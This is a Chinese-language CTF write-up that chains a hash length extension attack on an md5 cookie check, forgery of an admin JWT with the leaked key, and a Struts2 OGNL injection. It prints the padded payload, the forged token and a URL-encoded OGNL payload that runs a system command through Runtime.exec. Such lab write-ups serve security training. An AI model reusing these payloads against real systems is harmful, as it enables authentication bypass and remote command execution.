# Writeup

## 步骤1

登录进页面，在注释中发现`JWT_key.php`，猜测此次是与JWT相关

![image-20230703142514651](Writeup/image-20230703142514651.png)

访问`JWT_key.php`,发现源码

```php
<?php
highlight_file(__FILE__);
include "./secret_key.php";
include "./salt.php";
//$salt = XXXXXXXXXXXXXX // the salt include 14 characters
//md5($salt."adminroot")=e6ccbf12de9d33ec27a5bcfb6a3293df
@$username = urldecode($_POST["username"]);
@$password = urldecode($_POST["password"]);
if (!empty($_COOKIE["digest"])) {
    if ($username === "admin" && $password != "root") {
         if ($_COOKIE["digest"] === md5($salt.$username.$password)) {
            die ("The secret_key is ". $secret_key);
        }
        else {
            die ("Your cookies don't match up! STOP HACKING THIS SITE.");
        }
    }
    else {
        die ("no no no");
    }
}
```

发现此题是基于hash长度拓展攻击

`$salt`长度为14，并且知道`md5($salt."adminroot")=e6ccbf12de9d33ec27a5bcfb6a3293df`

观察源码，要想得到jwt，需要设置key为digest的cookie，并且username为admin，password不为root

打开`Hashpump工具`，输入相关参数

![image-20230703161546314](Writeup/image-20230703161546314.png)

其中`e73c228e8b50e5b3bcc6538c834e0f09`就是我们cookie中digest的值，

由于源码中的判断条件是`$_COOKIE["digest"] === md5($salt.$username.$password)`

并且$username=admin，因此password需要去掉admin

即$password为

```
root\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00aaa
```

经过url编码后得到最终的password：

```
root%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%b8%00%00%00%00%00%00%00aaa
```

因此，我们需要传递3个东西：

* cookie中的digest
* post传参username
* post传参password

![image-20230703173537133](Writeup/image-20230703173537133.png)

得到jwt_key: `sk-he00lctf3r`

## 步骤2

得到jwt_key后，我们返回主页面，查看cookie中的access_token:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIiwiZXhwIjoyMDAzOTg0NTkwfQ.plOP0NkPodstX61RDYjOO7l_PlW9fhngDcR_v87HL0c
```

在`http:jwt.io`中解密

![image-20230703143840694](Writeup/image-20230703143840694.png)

把sub的值改为admin，得到admin对应的jwt

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MjAwMzk4NDU5MH0.iZ0LyY2xwCGy_E3mcoiYhka4NxoAwd36HhfChUpZJJU
```

修改cookie中的access_token，然后刷新页面,发现重定向到新的页面

![image-20230703144004483](Writeup/image-20230703144004483.png)

## 步骤3

观察标签名，猜测与struts2漏洞有关

当用户提交 age 为字符串而非整形数值时，后端用代码拼接 `"'" + value + "'"` 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式。

payload:

```
%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27printenv+FLAG%27%29.getInputStream%28%29%29%29+%2B+%27
```

![image-20230703162628427](Writeup/image-20230703162628427.png)

![image-20230703162043219](Writeup/image-20230703162043219.png)

